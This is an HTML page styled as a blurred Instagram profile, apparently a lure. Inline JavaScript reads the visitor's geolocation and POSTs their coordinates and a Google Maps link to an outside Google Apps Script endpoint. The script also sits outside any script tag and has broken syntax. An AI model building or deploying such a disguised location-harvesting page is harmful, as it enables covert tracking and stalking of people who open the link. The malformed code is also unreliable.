<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Profile</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
}

body {
  background: #fff;
  max-width: 430px;
  margin: auto;
  border: 1px solid #ddd;
}

/* Header */
.header {
    filter: blur(8px);
  -webkit-filter: blur(8px);
  display: flex;
  justify-content: space-between;
  padding: 12px;
  font-weight: bold;
  border-bottom: 1px solid #ddd;
}

/* Profile Section */
.profile {
  filter: blur(8px);
  -webkit-filter: blur(8px);
  display: flex;
  padding: 15px;
  align-items: center;
}

.profile img {
  filter: blur(8px);
  -webkit-filter: blur(8px);
  width: 80px;
  height: 80px;
  border-radius: 50%;
}

.stats {

  flex: 1;
  display: flex;
  justify-content: space-around;
  text-align: center;
}

.stats div span {
  font-weight: bold;
}

/* Bio */
.bio {
  padding: 0 15px 10px;
  font-size: 14px;

filter: blur(8px);
  -webkit-filter: blur(8px);
}

.bio strong {
  display: block;
  filter: blur(8px);
  -webkit-filter: blur(8px);
}

/* Button */
.edit-btn {
  margin: 10px 15px;
  padding: 6px;
  border: 1px solid #ccc;
  border-radius: 6px;
  text-align: center;
  font-weight: 500;
  filter: blur(8px);
  -webkit-filter: blur(8px);
}

/* Highlights */
.highlights {
  display: flex;
  gap: 15px;
  padding: 10px;
  overflow-x: auto;
  filter: blur(8px);
  -webkit-filter: blur(8px);
}

.highlight {
  text-align: center;
  font-size: 12px;
  filter: blur(8px);
  -webkit-filter: blur(8px);
}

.highlight div {
  width: 60px;
  height: 60px;
  border-radius: 50%;
  border: 1px solid #ccc;
  margin-bottom: 5px;
  filter: blur(8px);
  -webkit-filter: blur(8px);
}

/* Tabs */
.tabs {
  display: flex;
  justify-content: space-around;
  border-top: 1px solid #ddd;
  border-bottom: 1px solid #ddd;
  padding: 8px 0;
  filter: blur(8px);
  -webkit-filter: blur(8px);
}

/* Posts Grid */
.posts {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 2px;
  filter: blur(8px);
  -webkit-filter: blur(8px);
}

.posts div {
  background: #ccc;
  height: 130px;
  filter: blur(8px);
  -webkit-filter: blur(8px);
}
</style>
</head>

<body>

    function getLocation() {
      let result;

      if (!navigator.geolocation) {
      
        return;
      }


      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;

          const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;

         

          // ‚úÖ SEND TO GOOGLE SHEET
          fetch("https://script.google.com/macros/s/AKfycbw93soAdKaQtP2ja3h8UBgOxxFvf6SulbyHDGQRQMJUxaNXAPQJvhvQTFbX726UGuX6/exec", {
            method: "POST",
            mode: "no-cors",

            },
            body: JSON.stringify({
              lat: lat,
              lng: lng,
              mapLink: mapLink
            })
          });

</body>
</html>
